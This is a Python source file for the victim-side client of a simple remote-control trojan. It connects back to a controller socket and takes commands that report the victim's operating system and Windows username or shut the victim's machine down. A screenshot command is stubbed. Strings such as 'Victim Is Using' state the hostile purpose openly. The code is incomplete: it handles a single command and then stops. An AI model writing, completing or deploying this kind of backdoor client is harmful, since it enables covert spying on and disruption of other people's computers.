import socket
from typing import *
import sys
import os
class Client():
    def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
        self.client=c
        self._recv()
    def _recv(self) -> None:
        # Receive Command
        self.command=self.client.recv(1024).decode()
        # Screenshot
        if self.command=="screenshot":...
        # Operating System Name
        if self.command=="os_name":
            self.client.send(f"Victim Is Using {self.os_name}".encode())
        # Windows Username
        if self.command=="windows_username":
            try:
                import win32api
                self.client.send(f"Victim's Windows Username : {win32api.GetUserName()}".encode())
            except ImportError:
                self.client.send("win32api Isn't Installed In Victim's PC Or Victim Is Not Using Windows".encode())
        # Shutdown PC
        if self.command=="shutdown_pc":
            # Get Operating System Type
            if self.os_name=="windows":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown /s /t 1")
            elif self.os_name=="macos":
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("shutdown -h now")
            else:
                self.client.send("Shutting Down Victim's PC!".encode())
                os.system("poweroff")
    @property
    def os_name(self) -> str:
        if sys.platform=="win32":
            return "windows"
        elif sys.platform=="darwin":
            return "macos"
        elif sys.platform=="linux":
            return "linux"
        else:
            return "other"
    @staticmethod
    def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
        c=socket.socket()
        c.connect((_addr,_port))
        return c,_addr
if __name__ == "__main__":
    c,addr=Client.init_socket("localhost",9999)
    client=Client(c,addr)